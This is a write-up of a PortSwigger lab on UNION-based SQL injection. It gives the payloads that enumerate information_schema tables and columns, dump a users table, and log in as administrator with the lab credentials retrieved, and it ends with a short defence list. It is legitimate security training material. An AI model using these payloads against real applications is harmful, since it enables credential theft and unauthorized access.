# 📘 PortSwigger Lab: SQL injection attack, listing the database contents on non-Oracle databases

<a id="top"></a>

> 🔗 Lab: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle

---

# 📑 Table of Contents

- [📘 PortSwigger Lab: SQL injection attack, listing the database contents on non-Oracle databases](#-portswigger-lab-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases)
- [📑 Table of Contents](#-table-of-contents)
- [🎯 Goal](#-goal)
- [🧠 Attack idea](#-attack-idea)
- [🔍 Step 1 — Find tables](#-step-1--find-tables)
- [Result](#result)
- [🔍 Step 2 — Find columns](#-step-2--find-columns)
- [Result](#result-1)
- [🔍 Step 3 — Retrieve data](#-step-3--retrieve-data)
- [Result](#result-2)
- [🔍 Step 4 — Login as administrator](#-step-4--login-as-administrator)
- [Result](#result-3)
- [🧩 Payloads used](#-payloads-used)
- [💥 Why the attack worked](#-why-the-attack-worked)
- [🛡 Defense](#-defense)
- [🛠 Checklist](#-checklist)
- [⬆ Back to top](#-back-to-top)

---

<a id="goal"></a>

# 🎯 Goal

Find the user table, identify username/password columns, retrieve credentials, and log in as administrator.

---

<a id="idea"></a>

# 🧠 Attack idea

Use `information_schema` metadata tables to enumerate the database structure.

Attack chain:

```text
SQLi
↓
information_schema.tables
↓
information_schema.columns
↓
users table
↓
credentials
↓
administrator login
```

---

<a id="step1"></a>

# 🔍 Step 1 — Find tables

Payload:

```sql
' UNION SELECT NULL,table_name FROM information_schema.tables--
```

---

# Result

The following table was identified:

```text
users_ulzlmi
```

---

<a id="step2"></a>

# 🔍 Step 2 — Find columns

Payload:

```sql
' UNION SELECT NULL,column_name
FROM information_schema.columns
WHERE table_name='users_ulzlmi'--
```

---

# Result

Columns discovered:

```text
email
username_mzwppu
password_iwdthc
```

---

<a id="step3"></a>

# 🔍 Step 3 — Retrieve data

Payload:

```sql
' UNION SELECT username_mzwppu,password_iwdthc
FROM users_ulzlmi--
```

---

# Result

Credentials retrieved:

<details>
<summary>Show users credentials</summary>

```text
carlos         p1hsv8fnrvkrhtachdm9
wiener         aqk737chd0d3t02nuif4
administrator  crk2odwjuiiv1131ra8l
```

</details>

---

<a id="step4"></a>

# 🔍 Step 4 — Login as administrator

Use:

<details>
<summary>Show administrator credentials</summary>

```text
Username: administrator
Password: crk2odwjuiiv1131ra8l
```

</details>

---

# Result

Successfully logged in as administrator.

Lab solved.

---

<a id="payloads"></a>

# 🧩 Payloads used

Find tables:

```sql
UNION SELECT NULL,table_name FROM information_schema.tables--
```

Find columns:

```sql
UNION SELECT NULL,column_name
FROM information_schema.columns
WHERE table_name='users_ulzlmi'--
```

Retrieve data:

```sql
UNION SELECT username_mzwppu,password_iwdthc
FROM users_ulzlmi--
```

---

<a id="why"></a>

# 💥 Why the attack worked

The application:
- inserted user input directly into SQL;
- allowed UNION SELECT execution;
- displayed query results in the response.

---

<a id="defense"></a>

# 🛡 Defense

- Prepared Statements
- Parameterized Queries
- Least Privilege
- Restrict metadata access
- Do not expose SQL errors

---

<a id="checklist"></a>

# 🛠 Checklist

- [ ] SQL Injection identified
- [ ] users table identified
- [ ] username/password columns identified
- [ ] credentials retrieved
- [ ] administrator login completed

---

# ⬆ Back to top

[Return to top](#top)
